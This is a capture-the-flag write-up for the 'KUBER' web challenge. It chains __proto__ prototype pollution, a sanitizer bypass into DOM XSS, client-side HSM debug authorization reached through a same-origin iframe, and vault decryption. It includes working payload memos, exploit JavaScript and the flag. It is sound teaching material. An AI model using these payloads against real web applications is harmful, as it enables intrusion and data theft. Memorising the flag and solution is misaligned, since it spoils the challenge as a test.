# KUBER --- CTF Writeup

## Vulnerabilities

### 1. Prototype Pollution

The transaction memo parser accepts a JSON configuration block and
passes it to a recursive `deepMerge()` function.

The merge does not protect against the `__proto__` property:

``` text
deepMerge(SanitizerEngine.options, parsedConfig)
```

Because of this, attacker-controlled JSON can modify inherited
properties on `Object.prototype`.

The important properties are:

``` text
allowedTags
allowedAttributes
```

This allows an attacker to extend the sanitizer configuration so that
normally dangerous HTML elements and event-handler attributes are
accepted.

------------------------------------------------------------------------

### 2. DOM XSS through the Custom Sanitizer

Transaction notes are eventually inserted with:

``` javascript
noteContainer.innerHTML = sanitizedContent;
```

The custom sanitizer removes most dangerous elements by default, but the
prototype-pollution vulnerability allows its allowlist to be modified.

An attacker can therefore make an element such as:

``` html
<img src=x onerror="...">
```

survive sanitization.

When the image fails to load, the `onerror` handler executes JavaScript
in the KUBER origin.

------------------------------------------------------------------------

### 3. Insecure HSM Diagnostic Authorization

The HSM widget accepts a `LEVEL_4_ROOT` signing request only when:

``` javascript
data.debugBypass === true
```

or:

``` javascript
window.KUBER_ENCLAVE_DEBUG === true
```

The diagnostic authorization is entirely client-side.

Because the HSM iframe is same-origin, JavaScript executing in the
parent page can access:

``` javascript
iframe.contentWindow
```

and manipulate the widget's client-side state.

This allows the attacker-controlled JavaScript to authorize a Level-4
attestation request.

------------------------------------------------------------------------

### 4. Client-Side Trust of the HSM Attestation

The parent application accepts the HSM response and uses the returned
signature as the input to the vault decryption routine.

There is no server-side verification of the attestation.

Once a valid Level-4 HMAC signature is obtained, it becomes the key
material for the PBKDF2 → AES-GCM decryption process.

------------------------------------------------------------------------

# Steps to Solve

## 1. Open the Transaction Interface

Navigate to:

``` text
transactions.html
```

The transaction page allows custom transaction data to be supplied
through the `memo` URL parameter.

The application decodes this parameter and creates a transaction
containing the supplied memo.

------------------------------------------------------------------------

## 2. Identify the Memo Metadata Parser

Inspect the transaction JavaScript and locate:

``` text
parseMemoPayload()
```

Notice that metadata between:

``` text
---config
...
---
```

is parsed as JSON and passed to:

``` text
deepMerge()
```

The merge function recursively copies attacker-controlled properties
without protecting special object properties such as:

``` text
__proto__
```

------------------------------------------------------------------------

## 3. Poison the Sanitizer Configuration

Use a configuration block that changes the inherited sanitizer
allowlists:

``` json
{
  "__proto__": {
    "allowedTags": ["img"],
    "allowedAttributes": ["src", "onerror"]
  }
}
```

The complete malicious memo can then be structured as:

``` text
---config
{"__proto__":{"allowedTags":["img"],"allowedAttributes":["src","onerror"]}}
---
<img src=x onerror="PAYLOAD">
```

The important effect is that the sanitizer now permits an `img` element
and its `onerror` attribute.

------------------------------------------------------------------------

## 4. Trigger DOM XSS

The transaction note is inserted using `innerHTML`.

Use an image whose loading fails:

``` html
<img src=x onerror="PAYLOAD">
```

The `onerror` handler executes JavaScript in the KUBER page.

At this point the prototype-pollution vulnerability has been converted
into JavaScript execution.

------------------------------------------------------------------------

## 5. Access the HSM Iframe

The transaction page contains the HSM iframe:

``` text
security-widget.html
```

Because it is same-origin, the XSS can access its `contentWindow`.

Set the diagnostic authorization inside the iframe:

``` javascript
const frame = document.getElementById('hsm-enclave-frame');
frame.contentWindow.KUBER_ENCLAVE_DEBUG = true;
```

------------------------------------------------------------------------

## 6. Request Level-4 Attestation

Trigger the existing KUBER security function:

``` javascript
KuberSecurity.sendEnclaveChallenge(
    'LEVEL_4_ROOT',
    'KUBER-SEC-CHALLENGE-2026'
);
```

The HSM widget now accepts the Level-4 request and generates the
HMAC-SHA256 attestation signature.

------------------------------------------------------------------------

## 7. Capture the Attestation Response

The HSM responds through `postMessage`.

A listener can capture the response:

``` javascript
window.addEventListener('message', async (event) => {
    if (
        event.data?.action === 'HSM_ATTESTATION_RESPONSE' &&
        event.data?.status === 'SUCCESS'
    ) {
        const signature = event.data.payload.signature;

        const vault = await KuberSecurity.decryptVaultData(signature);

        console.log(vault);
        console.log(vault.flag);
    }
});
```

The returned signature is the exact key material expected by the vault
decryption routine.

------------------------------------------------------------------------

## 8. Decrypt the Vault

The application performs:

``` text
HSM HMAC-SHA256 signature
        ↓
PBKDF2
        ↓
100,000 iterations
        ↓
SHA-256
        ↓
AES-256-GCM
        ↓
Vault payload
```

Calling:

``` javascript
KuberSecurity.decryptVaultData(signature)
```

returns the decrypted vault object.

The flag is stored in:

``` javascript
vault.flag
```

------------------------------------------------------------------------

## 9. Flag

``` text
NullOrigin{kUb3rr_15_r1cH_th0ugh}
```

------------------------------------------------------------------------

# Exploit Chain

``` text
Transaction memo
      ↓
JSON metadata
      ↓
__proto__ prototype pollution
      ↓
Modify sanitizer allowlist
      ↓
Allow <img> + onerror
      ↓
DOM XSS
      ↓
Access same-origin HSM iframe
      ↓
Enable KUBER_ENCLAVE_DEBUG
      ↓
Request LEVEL_4_ROOT attestation
      ↓
Receive HMAC signature
      ↓
PBKDF2 + AES-256-GCM
      ↓
Decrypt vault
      ↓
FLAG
```
